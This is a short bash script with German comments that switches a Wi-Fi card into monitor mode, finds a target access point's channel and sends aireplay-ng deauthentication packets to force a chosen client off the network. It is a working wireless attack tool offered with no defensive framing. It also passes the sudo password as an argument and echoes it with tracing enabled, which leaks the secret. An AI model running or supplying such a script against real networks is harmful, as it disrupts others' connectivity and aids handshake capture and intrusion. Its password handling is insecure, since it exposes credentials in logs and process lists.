#!/bin/bash

set -x

INTERFACE="$1"       # WLAN-Interface, z.B. wlan0
AP_MAC="$2"          # BSSID des Access Points
CLIENT_MAC="$3"      # MAC-Adresse des Clients
OLD_CHANNEL="$4" # Kanal, auf dem gesendet werden soll
PACKETS="$5"
SECRET="$6"          # sudo-Passwort


# 1) Interface prüfen und in Monitor-Modus schalten
if ! ip link show "$INTERFACE" &>/dev/null; then
  echo "Interface $INTERFACE not found"
  exit 1
fi

echo $SECRET | sudo -S airmon-ng check kill
echo $SECRET | sudo -S airmon-ng stop "$INTERFACE"

MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
if [ "$MODE" != "Monitor" ]; then
  echo "[i] Setze $INTERFACE in Monitor-Modus..."
  echo $SECRET | sudo -S ip link set "$INTERFACE" down
  echo $SECRET | sudo -S iw dev "$INTERFACE" set type monitor
  echo $SECRET | sudo -S ip link set "$INTERFACE" up
  echo $SECRET | sudo -S iw dev "$INTERFACE" set power_save off
fi

# 2) Aktuellen Kanal ermitteln
echo "[i] Ermittle aktuellen Kanal für BSSID $AP_MAC ..."
# iw scan verlangt manchmal managed mode; wir nutzen monitor mode scan:
CHAN_DETECTED=$(sudo iw dev "$INTERFACE" scan ap "$AP_MAC" 2>/dev/null \
  | grep -m1 "DS Parameter set:" \
  | awk '{print $4}')

if [ -n "$CHAN_DETECTED" ]; then
  TARGET_CHANNEL="$CHAN_DETECTED"
  echo "[i] Gefundener Kanal: $TARGET_CHANNEL"
else
  if [ -n "$OLD_CHANNEL" ]; then
    TARGET_CHANNEL="$OLD_CHANNEL"
    echo "[!] Kanal konnte nicht ermittelt, verwende übergebenen Kanal: $TARGET_CHANNEL"
  else
    TARGET_CHANNEL=""
    echo "[!] Kanal konnte nicht ermittelt und keiner übergeben – scanne kanal-hopping"
  fi
fi

echo $SECRET | sudo -S iwconfig "$INTERFACE" channel $TARGET_CHANNEL

echo $SECRET | sudo -S aireplay-ng --deauth $PACKETS -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
